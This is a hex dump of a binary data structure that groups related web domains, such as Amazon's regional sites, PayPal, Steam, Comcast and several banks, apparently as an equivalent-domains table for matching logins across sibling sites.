00001EA0: 6F 76 65 72 74 75 72 65  2E 63 6F 6D 00 00 00 00  overture.com....
00001EB0: 01 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00001EC0: 79 61 68 6F 6F 2E 63 6F  6D 00 00 00 00 00 00 00  yahoo.com.......
00001ED0: 00 00 00 00 13 00 FF FF  0D 00 00 00 03 00 FF FF  ................
00001EE0: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00001EF0: 0D 00 00 80 04 00 FF FF  7A 6F 6E 65 61 6C 61 72  ........zonealar
00001F00: 6D 2E 63 6F 6D 00 00 00  01 00 00 00 03 00 FF FF  m.com...........
00001F10: 0C 00 00 80 04 00 FF FF  7A 6F 6E 65 6C 61 62 73  ........zonelabs
00001F20: 2E 63 6F 6D 00 00 00 00  00 00 00 00 13 00 FF FF  .com............
00001F30: 0E 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  ................
00001F40: 00 00 00 00 03 00 FF FF  0A 00 00 80 04 00 FF FF  ................
00001F50: 70 61 79 70 61 6C 2E 63  6F 6D 00 00 00 00 00 00  paypal.com......
00001F60: 01 00 00 00 03 00 FF FF  11 00 00 80 04 00 FF FF  ................
00001F70: 70 61 79 70 61 6C 2D 73  65 61 72 63 68 2E 63 6F  paypal-search.co
00001F80: 6D 00 00 00 00 00 00 00  00 00 00 00 13 00 FF FF  m...............
00001F90: 0F 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  ................
00001FA0: 00 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00001FB0: 61 76 6F 6E 2E 63 6F 6D  01 00 00 00 03 00 FF FF  avon.com........
00001FC0: 0C 00 00 80 04 00 FF FF  79 6F 75 72 61 76 6F 6E  ........youravon
00001FD0: 2E 63 6F 6D 00 00 00 00  00 00 00 00 13 00 FF FF  .com............
00001FE0: 10 00 00 00 03 00 FF FF  0B 00 00 00 07 00 FF FF  ................
00001FF0: 00 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00002000: 64 69 61 70 65 72 73 2E  63 6F 6D 00 00 00 00 00  diapers.com.....
00002010: 01 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00002020: 73 6F 61 70 2E 63 6F 6D  02 00 00 00 03 00 FF FF  soap.com........
00002030: 07 00 00 80 04 00 FF FF  77 61 67 2E 63 6F 6D 00  ........wag.com.
00002040: 03 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00002050: 79 6F 79 6F 2E 63 6F 6D  04 00 00 00 03 00 FF FF  yoyo.com........
00002060: 0D 00 00 80 04 00 FF FF  62 65 61 75 74 79 62 61  ........beautyba
00002070: 72 2E 63 6F 6D 00 00 00  05 00 00 00 03 00 FF FF  r.com...........
00002080: 08 00 00 80 04 00 FF FF  63 61 73 61 2E 63 6F 6D  ........casa.com
00002090: 06 00 00 00 03 00 FF FF  0F 00 00 80 04 00 FF FF  ................
000020A0: 61 66 74 65 72 73 63 68  6F 6F 6C 2E 63 6F 6D 00  afterschool.com.
000020B0: 07 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
000020C0: 76 69 6E 65 2E 63 6F 6D  08 00 00 00 03 00 FF FF  vine.com........
000020D0: 0C 00 00 80 04 00 FF FF  62 6F 6F 6B 77 6F 72 6D  ........bookworm
000020E0: 2E 63 6F 6D 00 00 00 00  09 00 00 00 03 00 FF FF  .com............
000020F0: 08 00 00 80 04 00 FF FF  6C 6F 6F 6B 2E 63 6F 6D  ........look.com
00002100: 0A 00 00 00 03 00 FF FF  0E 00 00 80 04 00 FF FF  ................
00002110: 76 69 6E 65 6D 61 72 6B  65 74 2E 63 6F 6D 00 00  vinemarket.com..
00002120: 00 00 00 00 13 00 FF FF  11 00 00 00 03 00 FF FF  ................
00002130: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002140: 10 00 00 80 04 00 FF FF  31 38 30 30 63 6F 6E 74  ........1800cont
00002150: 61 63 74 73 2E 63 6F 6D  01 00 00 00 03 00 FF FF  acts.com........
00002160: 0F 00 00 80 04 00 FF FF  38 30 30 63 6F 6E 74 61  ........800conta
00002170: 63 74 73 2E 63 6F 6D 00  00 00 00 00 13 00 FF FF  cts.com.........
00002180: 12 00 00 00 03 00 FF FF  13 00 00 00 07 00 FF FF  ................
00002190: 00 00 00 00 03 00 FF FF  0A 00 00 80 04 00 FF FF  ................
000021A0: 61 6D 61 7A 6F 6E 2E 63  6F 6D 00 00 00 00 00 00  amazon.com......
000021B0: 01 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
000021C0: 61 6D 61 7A 6F 6E 2E 63  6F 6D 2E 62 65 00 00 00  amazon.com.be...
000021D0: 02 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
000021E0: 61 6D 61 7A 6F 6E 2E 61  65 00 00 00 00 00 00 00  amazon.ae.......
000021F0: 03 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00002200: 61 6D 61 7A 6F 6E 2E 63  61 00 00 00 00 00 00 00  amazon.ca.......
00002210: 04 00 00 00 03 00 FF FF  0C 00 00 80 04 00 FF FF  ................
00002220: 61 6D 61 7A 6F 6E 2E 63  6F 2E 75 6B 00 00 00 00  amazon.co.uk....
00002230: 05 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00002240: 61 6D 61 7A 6F 6E 2E 63  6F 6D 2E 61 75 00 00 00  amazon.com.au...
00002250: 06 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00002260: 61 6D 61 7A 6F 6E 2E 63  6F 6D 2E 62 72 00 00 00  amazon.com.br...
00002270: 07 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00002280: 61 6D 61 7A 6F 6E 2E 63  6F 6D 2E 6D 78 00 00 00  amazon.com.mx...
00002290: 08 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
000022A0: 61 6D 61 7A 6F 6E 2E 63  6F 6D 2E 74 72 00 00 00  amazon.com.tr...
000022B0: 09 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
000022C0: 61 6D 61 7A 6F 6E 2E 64  65 00 00 00 00 00 00 00  amazon.de.......
000022D0: 0A 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
000022E0: 61 6D 61 7A 6F 6E 2E 65  73 00 00 00 00 00 00 00  amazon.es.......
000022F0: 0B 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00002300: 61 6D 61 7A 6F 6E 2E 66  72 00 00 00 00 00 00 00  amazon.fr.......
00002310: 0C 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00002320: 61 6D 61 7A 6F 6E 2E 69  6E 00 00 00 00 00 00 00  amazon.in.......
00002330: 0D 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00002340: 61 6D 61 7A 6F 6E 2E 69  74 00 00 00 00 00 00 00  amazon.it.......
00002350: 0E 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00002360: 61 6D 61 7A 6F 6E 2E 6E  6C 00 00 00 00 00 00 00  amazon.nl.......
00002370: 0F 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00002380: 61 6D 61 7A 6F 6E 2E 70  6C 00 00 00 00 00 00 00  amazon.pl.......
00002390: 10 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
000023A0: 61 6D 61 7A 6F 6E 2E 73  61 00 00 00 00 00 00 00  amazon.sa.......
000023B0: 11 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
000023C0: 61 6D 61 7A 6F 6E 2E 73  65 00 00 00 00 00 00 00  amazon.se.......
000023D0: 12 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
000023E0: 61 6D 61 7A 6F 6E 2E 73  67 00 00 00 00 00 00 00  amazon.sg.......
000023F0: 00 00 00 00 13 00 FF FF  13 00 00 00 03 00 FF FF  ................
00002400: 03 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002410: 07 00 00 80 04 00 FF FF  63 6F 78 2E 63 6F 6D 00  ........cox.com.
00002420: 01 00 00 00 03 00 FF FF  07 00 00 80 04 00 FF FF  ................
00002430: 63 6F 78 2E 6E 65 74 00  02 00 00 00 03 00 FF FF  cox.net.........
00002440: 0F 00 00 80 04 00 FF FF  63 6F 78 62 75 73 69 6E  ........coxbusin
00002450: 65 73 73 2E 63 6F 6D 00  00 00 00 00 13 00 FF FF  ess.com.........
00002460: 14 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  ................
00002470: 00 00 00 00 03 00 FF FF  13 00 00 80 04 00 FF FF  ................
00002480: 6D 79 6E 6F 72 74 6F 6E  61 63 63 6F 75 6E 74 2E  mynortonaccount.
00002490: 63 6F 6D 00 00 00 00 00  01 00 00 00 03 00 FF FF  com.............
000024A0: 0A 00 00 80 04 00 FF FF  6E 6F 72 74 6F 6E 2E 63  ........norton.c
000024B0: 6F 6D 00 00 00 00 00 00  00 00 00 00 13 00 FF FF  om..............
000024C0: 15 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  ................
000024D0: 00 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
000024E0: 76 65 72 69 7A 6F 6E 2E  63 6F 6D 00 00 00 00 00  verizon.com.....
000024F0: 01 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00002500: 76 65 72 69 7A 6F 6E 2E  6E 65 74 00 00 00 00 00  verizon.net.....
00002510: 00 00 00 00 13 00 FF FF  16 00 00 00 03 00 FF FF  ................
00002520: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002530: 0B 00 00 80 04 00 FF FF  72 61 6B 75 74 65 6E 2E  ........rakuten.
00002540: 63 6F 6D 00 00 00 00 00  01 00 00 00 03 00 FF FF  com.............
00002550: 07 00 00 80 04 00 FF FF  62 75 79 2E 63 6F 6D 00  ........buy.com.
00002560: 00 00 00 00 13 00 FF FF  17 00 00 00 03 00 FF FF  ................
00002570: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002580: 0C 00 00 80 04 00 FF FF  73 69 72 69 75 73 78 6D  ........siriusxm
00002590: 2E 63 6F 6D 00 00 00 00  01 00 00 00 03 00 FF FF  .com............
000025A0: 0A 00 00 80 04 00 FF FF  73 69 72 69 75 73 2E 63  ........sirius.c
000025B0: 6F 6D 00 00 00 00 00 00  00 00 00 00 13 00 FF FF  om..............
000025C0: 18 00 00 00 03 00 FF FF  04 00 00 00 07 00 FF FF  ................
000025D0: 00 00 00 00 03 00 FF FF  06 00 00 80 04 00 FF FF  ................
000025E0: 65 61 2E 63 6F 6D 00 00  01 00 00 00 03 00 FF FF  ea.com..........
000025F0: 0A 00 00 80 04 00 FF FF  6F 72 69 67 69 6E 2E 63  ........origin.c
00002600: 6F 6D 00 00 00 00 00 00  02 00 00 00 03 00 FF FF  om..............
00002610: 0D 00 00 80 04 00 FF FF  70 6C 61 79 34 66 72 65  ........play4fre
00002620: 65 2E 63 6F 6D 00 00 00  03 00 00 00 03 00 FF FF  e.com...........
00002630: 14 00 00 80 04 00 FF FF  74 69 62 65 72 69 75 6D  ........tiberium
00002640: 61 6C 6C 69 61 6E 63 65  2E 63 6F 6D 00 00 00 00  alliance.com....
00002650: 00 00 00 00 13 00 FF FF  19 00 00 00 03 00 FF FF  ................
00002660: 04 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002670: 0D 00 00 80 04 00 FF FF  33 37 73 69 67 6E 61 6C  ........37signal
00002680: 73 2E 63 6F 6D 00 00 00  01 00 00 00 03 00 FF FF  s.com...........
00002690: 0C 00 00 80 04 00 FF FF  62 61 73 65 63 61 6D 70  ........basecamp
000026A0: 2E 63 6F 6D 00 00 00 00  02 00 00 00 03 00 FF FF  .com............
000026B0: 0E 00 00 80 04 00 FF FF  62 61 73 65 63 61 6D 70  ........basecamp
000026C0: 68 71 2E 63 6F 6D 00 00  03 00 00 00 03 00 FF FF  hq.com..........
000026D0: 0E 00 00 80 04 00 FF FF  68 69 67 68 72 69 73 65  ........highrise
000026E0: 68 71 2E 63 6F 6D 00 00  00 00 00 00 13 00 FF FF  hq.com..........
000026F0: 1A 00 00 00 03 00 FF FF  03 00 00 00 07 00 FF FF  ................
00002700: 00 00 00 00 03 00 FF FF  10 00 00 80 04 00 FF FF  ................
00002710: 73 74 65 61 6D 70 6F 77  65 72 65 64 2E 63 6F 6D  steampowered.com
00002720: 01 00 00 00 03 00 FF FF  12 00 00 80 04 00 FF FF  ................
00002730: 73 74 65 61 6D 63 6F 6D  6D 75 6E 69 74 79 2E 63  steamcommunity.c
00002740: 6F 6D 00 00 00 00 00 00  02 00 00 00 03 00 FF FF  om..............
00002750: 0E 00 00 80 04 00 FF FF  73 74 65 61 6D 67 61 6D  ........steamgam
00002760: 65 73 2E 63 6F 6D 00 00  00 00 00 00 13 00 FF FF  es.com..........
00002770: 1B 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  ................
00002780: 00 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00002790: 63 68 61 72 74 2E 69 6F  01 00 00 00 03 00 FF FF  chart.io........
000027A0: 0B 00 00 80 04 00 FF FF  63 68 61 72 74 69 6F 2E  ........chartio.
000027B0: 63 6F 6D 00 00 00 00 00  00 00 00 00 13 00 FF FF  com.............
000027C0: 1C 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  ................
000027D0: 00 00 00 00 03 00 FF FF  0F 00 00 80 04 00 FF FF  ................
000027E0: 67 6F 74 6F 6D 65 65 74  69 6E 67 2E 63 6F 6D 00  gotomeeting.com.
000027F0: 01 00 00 00 03 00 FF FF  10 00 00 80 04 00 FF FF  ................
00002800: 63 69 74 72 69 78 6F 6E  6C 69 6E 65 2E 63 6F 6D  citrixonline.com
00002810: 00 00 00 00 13 00 FF FF  1D 00 00 00 03 00 FF FF  ................
00002820: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002830: 0B 00 00 80 04 00 FF FF  67 6F 67 6F 61 69 72 2E  ........gogoair.
00002840: 63 6F 6D 00 00 00 00 00  01 00 00 00 03 00 FF FF  com.............
00002850: 10 00 00 80 04 00 FF FF  67 6F 67 6F 69 6E 66 6C  ........gogoinfl
00002860: 69 67 68 74 2E 63 6F 6D  00 00 00 00 13 00 FF FF  ight.com........
00002870: 1E 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  ................
00002880: 00 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00002890: 6D 79 73 71 6C 2E 63 6F  6D 00 00 00 00 00 00 00  mysql.com.......
000028A0: 01 00 00 00 03 00 FF FF  0A 00 00 80 04 00 FF FF  ................
000028B0: 6F 72 61 63 6C 65 2E 63  6F 6D 00 00 00 00 00 00  oracle.com......
000028C0: 00 00 00 00 13 00 FF FF  1F 00 00 00 03 00 FF FF  ................
000028D0: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
000028E0: 0C 00 00 80 04 00 FF FF  64 69 73 63 6F 76 65 72  ........discover
000028F0: 2E 63 6F 6D 00 00 00 00  01 00 00 00 03 00 FF FF  .com............
00002900: 10 00 00 80 04 00 FF FF  64 69 73 63 6F 76 65 72  ........discover
00002910: 63 61 72 64 2E 63 6F 6D  00 00 00 00 13 00 FF FF  card.com........
00002920: 20 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF   ...............
00002930: 00 00 00 00 03 00 FF FF  07 00 00 80 04 00 FF FF  ................
00002940: 64 63 75 2E 6F 72 67 00  01 00 00 00 03 00 FF FF  dcu.org.........
00002950: 0E 00 00 80 04 00 FF FF  64 63 75 2D 6F 6E 6C 69  ........dcu-onli
00002960: 6E 65 2E 6F 72 67 00 00  00 00 00 00 13 00 FF FF  ne.org..........
00002970: 21 00 00 00 03 00 FF FF  03 00 00 00 07 00 FF FF  !...............
00002980: 00 00 00 00 03 00 FF FF  0E 00 00 80 04 00 FF FF  ................
00002990: 68 65 61 6C 74 68 63 61  72 65 2E 67 6F 76 00 00  healthcare.gov..
000029A0: 01 00 00 00 03 00 FF FF  12 00 00 80 04 00 FF FF  ................
000029B0: 63 75 69 64 61 64 6F 64  65 73 61 6C 75 64 2E 67  cuidadodesalud.g
000029C0: 6F 76 00 00 00 00 00 00  02 00 00 00 03 00 FF FF  ov..............
000029D0: 07 00 00 80 04 00 FF FF  63 6D 73 2E 67 6F 76 00  ........cms.gov.
000029E0: 00 00 00 00 13 00 FF FF  22 00 00 00 03 00 FF FF  ........".......
000029F0: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002A00: 09 00 00 80 04 00 FF FF  70 65 70 63 6F 2E 63 6F  ........pepco.co
00002A10: 6D 00 00 00 00 00 00 00  01 00 00 00 03 00 FF FF  m...............
00002A20: 11 00 00 80 04 00 FF FF  70 65 70 63 6F 68 6F 6C  ........pepcohol
00002A30: 64 69 6E 67 73 2E 63 6F  6D 00 00 00 00 00 00 00  dings.com.......
00002A40: 00 00 00 00 13 00 FF FF  23 00 00 00 03 00 FF FF  ........#.......
00002A50: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002A60: 0D 00 00 80 04 00 FF FF  63 65 6E 74 75 72 79 32  ........century2
00002A70: 31 2E 63 6F 6D 00 00 00  01 00 00 00 03 00 FF FF  1.com...........
00002A80: 0C 00 00 80 04 00 FF FF  32 31 6F 6E 6C 69 6E 65  ........21online
00002A90: 2E 63 6F 6D 00 00 00 00  00 00 00 00 13 00 FF FF  .com............
00002AA0: 24 00 00 00 03 00 FF FF  03 00 00 00 07 00 FF FF  $...............
00002AB0: 00 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00002AC0: 63 6F 6D 63 61 73 74 2E  63 6F 6D 00 00 00 00 00  comcast.com.....
00002AD0: 01 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00002AE0: 63 6F 6D 63 61 73 74 2E  6E 65 74 00 00 00 00 00  comcast.net.....
00002AF0: 02 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00002B00: 78 66 69 6E 69 74 79 2E  63 6F 6D 00 00 00 00 00  xfinity.com.....
00002B10: 00 00 00 00 13 00 FF FF  25 00 00 00 03 00 FF FF  ........%.......
00002B20: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002B30: 13 00 00 80 04 00 FF FF  63 72 69 63 6B 65 74 77  ........cricketw
00002B40: 69 72 65 6C 65 73 73 2E  63 6F 6D 00 00 00 00 00  ireless.com.....
00002B50: 01 00 00 00 03 00 FF FF  0F 00 00 80 04 00 FF FF  ................
00002B60: 61 69 6F 77 69 72 65 6C  65 73 73 2E 63 6F 6D 00  aiowireless.com.
00002B70: 00 00 00 00 13 00 FF FF  26 00 00 00 03 00 FF FF  ........&.......
00002B80: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002B90: 0D 00 00 80 04 00 FF FF  6D 61 6E 64 74 62 61 6E  ........mandtban
00002BA0: 6B 2E 63 6F 6D 00 00 00  01 00 00 00 03 00 FF FF  k.com...........
00002BB0: 07 00 00 80 04 00 FF FF  6D 74 62 2E 63 6F 6D 00  ........mtb.com.
00002BC0: 00 00 00 00 13 00 FF FF  27 00 00 00 03 00 FF FF  ........'.......
00002BD0: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002BE0: 0B 00 00 80 04 00 FF FF  64 72 6F 70 62 6F 78 2E  ........dropbox.
00002BF0: 63 6F 6D 00 00 00 00 00  01 00 00 00 03 00 FF FF  com.............
00002C00: 0E 00 00 80 04 00 FF FF  67 65 74 64 72 6F 70 62  ........getdropb
00002C10: 6F 78 2E 63 6F 6D 00 00  00 00 00 00 13 00 FF FF  ox.com..........
00002C20: 28 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  (...............
00002C30: 00 00 00 00 03 00 FF FF  0C 00 00 80 04 00 FF FF  ................
00002C40: 73 6E 61 70 66 69 73 68  2E 63 6F 6D 00 00 00 00  snapfish.com....
00002C50: 01 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00002C60: 73 6E 61 70 66 69 73 68  2E 63 61 00 00 00 00 00  snapfish.ca.....
00002C70: 00 00 00 00 13 00 FF FF  29 00 00 00 03 00 FF FF  ........).......
00002C80: 04 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002C90: 0B 00 00 80 04 00 FF FF  61 6C 69 62 61 62 61 2E  ........alibaba.
00002CA0: 63 6F 6D 00 00 00 00 00  01 00 00 00 03 00 FF FF  com.............
00002CB0: 0E 00 00 80 04 00 FF FF  61 6C 69 65 78 70 72 65  ........aliexpre
00002CC0: 73 73 2E 63 6F 6D 00 00  02 00 00 00 03 00 FF FF  ss.com..........
00002CD0: 0A 00 00 80 04 00 FF FF  61 6C 69 79 75 6E 2E 63  ........aliyun.c
00002CE0: 6F 6D 00 00 00 00 00 00  03 00 00 00 03 00 FF FF  om..............
00002CF0: 06 00 00 80 04 00 FF FF  6E 65 74 2E 63 6E 00 00  ........net.cn..
00002D00: 00 00 00 00 13 00 FF FF  2A 00 00 00 03 00 FF FF  ........*.......
00002D10: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002D20: 0F 00 00 80 04 00 FF FF  70 6C 61 79 73 74 61 74  ........playstat
00002D30: 69 6F 6E 2E 63 6F 6D 00  01 00 00 00 03 00 FF FF  ion.com.........
00002D40: 1C 00 00 80 04 00 FF FF  73 6F 6E 79 65 6E 74 65  ........sonyente
00002D50: 72 74 61 69 6E 6D 65 6E  74 6E 65 74 77 6F 72 6B  rtainmentnetwork
00002D60: 2E 63 6F 6D 00 00 00 00  00 00 00 00 13 00 FF FF  .com............
00002D70: 2B 00 00 00 03 00 FF FF  05 00 00 00 07 00 FF FF  +...............
00002D80: 00 00 00 00 03 00 FF FF  10 00 00 80 04 00 FF FF  ................
00002D90: 6D 65 72 63 61 64 6F 6C  69 76 72 65 2E 63 6F 6D  mercadolivre.com
00002DA0: 01 00 00 00 03 00 FF FF  13 00 00 80 04 00 FF FF  ................
00002DB0: 6D 65 72 63 61 64 6F 6C  69 76 72 65 2E 63 6F 6D  mercadolivre.com
00002DC0: 2E 62 72 00 00 00 00 00  02 00 00 00 03 00 FF FF  .br.............
00002DD0: 10 00 00 80 04 00 FF FF  6D 65 72 63 61 64 6F 6C  ........mercadol
00002DE0: 69 62 72 65 2E 63 6F 6D  03 00 00 00 03 00 FF FF  ibre.com........
00002DF0: 13 00 00 80 04 00 FF FF  6D 65 72 63 61 64 6F 6C  ........mercadol
00002E00: 69 62 72 65 2E 63 6F 6D  2E 61 72 00 00 00 00 00  ibre.com.ar.....
00002E10: 04 00 00 00 03 00 FF FF  13 00 00 80 04 00 FF FF  ................
00002E20: 6D 65 72 63 61 64 6F 6C  69 62 72 65 2E 63 6F 6D  mercadolibre.com
00002E30: 2E 6D 78 00 00 00 00 00  00 00 00 00 13 00 FF FF  .mx.............
00002E40: 2C 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  ,...............
00002E50: 00 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00002E60: 7A 65 6E 64 65 73 6B 2E  63 6F 6D 00 00 00 00 00  zendesk.com.....
00002E70: 01 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00002E80: 7A 6F 70 69 6D 2E 63 6F  6D 00 00 00 00 00 00 00  zopim.com.......
00002E90: 00 00 00 00 13 00 FF FF  2D 00 00 00 03 00 FF FF  ........-.......
00002EA0: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00002EB0: 0C 00 00 80 04 00 FF FF  61 75 74 6F 64 65 73 6B  ........autodesk
00002EC0: 2E 63 6F 6D 00 00 00 00  01 00 00 00 03 00 FF FF  .com............
00002ED0: 0D 00 00 80 04 00 FF FF  74 69 6E 6B 65 72 63 61  ........tinkerca
00002EE0: 64 2E 63 6F 6D 00 00 00  00 00 00 00 13 00 FF FF  d.com...........
00002EF0: 2E 00 00 00 03 00 FF FF  07 00 00 00 07 00 FF FF  ................
00002F00: 00 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00002F10: 72 61 69 6C 6E 61 74 69  6F 6E 2E 72 75 00 00 00  railnation.ru...
00002F20: 01 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00002F30: 72 61 69 6C 6E 61 74 69  6F 6E 2E 64 65 00 00 00  railnation.de...
00002F40: 02 00 00 00 03 00 FF FF  0F 00 00 80 04 00 FF FF  ................
00002F50: 72 61 69 6C 2D 6E 61 74  69 6F 6E 2E 63 6F 6D 00  rail-nation.com.
00002F60: 03 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00002F70: 72 61 69 6C 6E 61 74 69  6F 6E 2E 67 72 00 00 00  railnation.gr...
00002F80: 04 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00002F90: 72 61 69 6C 6E 61 74 69  6F 6E 2E 75 73 00 00 00  railnation.us...
00002FA0: 05 00 00 00 03 00 FF FF  0E 00 00 80 04 00 FF FF  ................
00002FB0: 74 72 75 63 6B 6E 61 74  69 6F 6E 2E 64 65 00 00  trucknation.de..
00002FC0: 06 00 00 00 03 00 FF FF  10 00 00 80 04 00 FF FF  ................
00002FD0: 74 72 61 76 69 61 6E 67  61 6D 65 73 2E 63 6F 6D  traviangames.com
00002FE0: 00 00 00 00 13 00 FF FF  2F 00 00 00 03 00 FF FF  ......../.......
00002FF0: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00003000: 09 00 00 80 04 00 FF FF  77 70 63 75 2E 63 6F 6F  ........wpcu.coo
00003010: 70 00 00 00 00 00 00 00  01 00 00 00 03 00 FF FF  p...............
00003020: 0E 00 00 80 04 00 FF FF  77 70 63 75 6F 6E 6C 69  ........wpcuonli
00003030: 6E 65 2E 63 6F 6D 00 00  00 00 00 00 13 00 FF FF  ne.com..........
00003040: 30 00 00 00 03 00 FF FF  03 00 00 00 07 00 FF FF  0...............
00003050: 00 00 00 00 03 00 FF FF  0E 00 00 80 04 00 FF FF  ................
00003060: 6D 61 74 68 6C 65 74 69  63 73 2E 63 6F 6D 00 00  mathletics.com..
00003070: 01 00 00 00 03 00 FF FF  11 00 00 80 04 00 FF FF  ................
00003080: 6D 61 74 68 6C 65 74 69  63 73 2E 63 6F 6D 2E 61  mathletics.com.a
00003090: 75 00 00 00 00 00 00 00  02 00 00 00 03 00 FF FF  u...............
000030A0: 10 00 00 80 04 00 FF FF  6D 61 74 68 6C 65 74 69  ........mathleti
000030B0: 63 73 2E 63 6F 2E 75 6B  00 00 00 00 13 00 FF FF  cs.co.uk........
000030C0: 31 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  1...............
000030D0: 00 00 00 00 03 00 FF FF  12 00 00 80 04 00 FF FF  ................
000030E0: 64 69 73 63 6F 75 6E 74  62 61 6E 6B 2E 63 6F 2E  discountbank.co.
000030F0: 69 6C 00 00 00 00 00 00  01 00 00 00 03 00 FF FF  il..............
00003100: 0E 00 00 80 04 00 FF FF  74 65 6C 65 62 61 6E 6B  ........telebank
00003110: 2E 63 6F 2E 69 6C 00 00  00 00 00 00 13 00 FF FF  .co.il..........
00003120: 32 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  2...............
00003130: 00 00 00 00 03 00 FF FF  06 00 00 80 04 00 FF FF  ................
00003140: 6D 69 2E 63 6F 6D 00 00  01 00 00 00 03 00 FF FF  mi.com..........
00003150: 0A 00 00 80 04 00 FF FF  78 69 61 6F 6D 69 2E 63  ........xiaomi.c
00003160: 6F 6D 00 00 00 00 00 00  00 00 00 00 13 00 FF FF  om..............
00003170: 33 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  3...............
00003180: 00 00 00 00 03 00 FF FF  0B 00 00 80 04 00 FF FF  ................
00003190: 70 6F 73 74 65 70 61 79  2E 69 74 00 00 00 00 00  postepay.it.....
000031A0: 01 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
000031B0: 70 6F 73 74 65 2E 69 74  00 00 00 00 13 00 FF FF  poste.it........
000031C0: 34 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  4...............
000031D0: 00 00 00 00 03 00 FF FF  0C 00 00 80 04 00 FF FF  ................
000031E0: 66 61 63 65 62 6F 6F 6B  2E 63 6F 6D 00 00 00 00  facebook.com....
000031F0: 01 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00003200: 6D 65 73 73 65 6E 67 65  72 2E 63 6F 6D 00 00 00  messenger.com...
00003210: 00 00 00 00 13 00 FF FF  35 00 00 00 03 00 FF FF  ........5.......
00003220: 03 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00003230: 0D 00 00 80 04 00 FF FF  73 6B 79 73 70 6F 72 74  ........skysport
00003240: 73 2E 63 6F 6D 00 00 00  01 00 00 00 03 00 FF FF  s.com...........
00003250: 0A 00 00 80 04 00 FF FF  73 6B 79 62 65 74 2E 63  ........skybet.c
00003260: 6F 6D 00 00 00 00 00 00  02 00 00 00 03 00 FF FF  om..............
00003270: 0C 00 00 80 04 00 FF FF  73 6B 79 76 65 67 61 73  ........skyvegas
00003280: 2E 63 6F 6D 00 00 00 00  00 00 00 00 13 00 FF FF  .com............
